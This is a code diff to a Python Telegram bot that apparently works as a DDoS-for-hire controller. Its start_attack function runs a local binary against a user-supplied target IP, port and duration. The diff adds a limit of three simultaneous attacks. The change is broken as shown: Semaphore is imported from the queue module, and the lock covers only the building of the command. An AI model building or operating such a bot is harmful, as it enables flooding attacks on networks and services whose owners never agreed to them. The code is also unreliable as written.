@@ -5,11 +5,13 @@ import itertools
 import requests
 import atexit
 import threading
+from queue import Semaphore
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS
 
-
+MAX_SIMULTANEOUS_ATTACKS = 3
+attack_semaphore = Semaphore(MAX_SIMULTANEOUS_ATTACKS)
 
 # Global variables
 user_processes = {}
@@ -19,7 +21,8 @@ MAX_DURATION = 300  # Max attack duration in seconds
 import atexit
 
 def start_attack(target_ip, port, duration, user_id):
-    command = ['./xxxx', target_ip, str(port), str(duration)]
+    with attack_semaphore:
+        command = ['./xxxx', target_ip, str(port), str(duration)]
     try:
         process = subprocess.Popen(command)
         user_processes[user_id] = {
